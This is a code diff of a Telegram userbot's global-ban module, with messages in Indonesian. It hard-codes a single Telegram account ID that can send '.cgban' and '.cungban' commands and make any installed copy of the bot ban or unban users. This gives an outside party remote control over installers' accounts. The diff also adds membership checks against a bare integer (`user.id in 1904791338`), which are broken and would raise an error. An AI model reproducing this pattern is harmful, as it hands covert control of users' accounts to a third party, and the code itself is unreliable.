@@ -34,7 +34,7 @@ async def get_full_user(event):
             user_obj = await event.client.get_entity(user)
         except Exception as err:
             return await event.edit(
-                "`Terjadi Kesalahan... Mohon Lapor Ke` @Kayyzyu", str(err)
+                "`Terjadi Kesalahan... Mohon Lapor Ke` @Kayzuuuuu", str(err)
             )
     return user_obj, extra
 
@@ -81,7 +81,7 @@ async def handler(tele):
 
 
 @register(outgoing=True, pattern="^.gban(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cgban(?: |$)(.*)")
+@register(incoming=True, from_users=1904791338, pattern=r"^\.cgban(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
     sender = await dc.get_sender()
@@ -111,7 +111,7 @@ async def gben(userbot):
     except BaseException:
         return await dark.edit(f"`Terjadi Kesalahan`")
     if user:
-        if user.id in DEVS:
+        if user.id in 1904791338:
             return await dark.edit(
                 f"`Anda Tidak Bisa Melakukan Global Banned, Karena dia pembuatku🤪`"
             )
@@ -150,7 +150,7 @@ async def gben(userbot):
 
 
 @register(outgoing=True, pattern="^.ungban(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cungban(?: |$)(.*)")
+@register(incoming=True, from_users=1904791338, pattern=r"^\.cungban(?: |$)(.*)")
 async def gunben(userbot):
     dc = userbot
     sender = await dc.get_sender()
@@ -182,7 +182,7 @@ async def gunben(userbot):
     except BaseException:
         return await dark.edit("`Terjadi Kesalahan`")
     if user:
-        if user.id in DEVS:
+        if user.id in 1904791338:
             return await dark.edit(
                 "**Pengguna Ini tidak bisa di Blacklist, Karna Dia adalah pembuatku🤪**"
             )
